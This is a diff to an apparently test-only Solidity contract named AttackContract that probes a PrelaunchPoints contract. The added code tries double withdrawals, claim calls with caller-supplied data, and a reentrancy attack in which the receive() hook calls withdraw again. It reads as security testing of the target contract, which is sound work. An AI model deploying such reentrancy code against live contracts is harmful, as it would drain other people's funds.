@@ -6,7 +6,6 @@ import "../../src/PrelaunchPoints.sol";
 contract AttackContract {
     PrelaunchPoints public prelaunchPoints;
     address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
-    bytes emptydata = new bytes(1);
 
     constructor(PrelaunchPoints _prelaunchPoints) {
         prelaunchPoints = _prelaunchPoints;
@@ -16,15 +15,29 @@ contract AttackContract {
         prelaunchPoints.withdraw(ETH);
     }
 
-    function attackClaim() external {
-        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
+    function attackWithdrawMultiple() external {
+        prelaunchPoints.withdraw(ETH);
+        // Attempt to withdraw again
+        prelaunchPoints.withdraw(ETH);
+    }
+
+    function attackClaim(uint8 percentage, bytes memory data) external {
+        prelaunchPoints.claim(ETH, percentage, PrelaunchPoints.Exchange.UniswapV3, data);
+    }
+
+    function attackReentrancy() external payable {
+        prelaunchPoints.lockETH{value: msg.value}(bytes32(0));
+        prelaunchPoints.withdraw(ETH);
     }
 
     receive() external payable {
         if (address(prelaunchPoints).balance > 0) {
             prelaunchPoints.withdraw(ETH);
         } else {
-            prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
+            prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, "");
         }
     }
+
+    // Function to allow the contract to receive ETH
+    fallback() external payable {}
 }
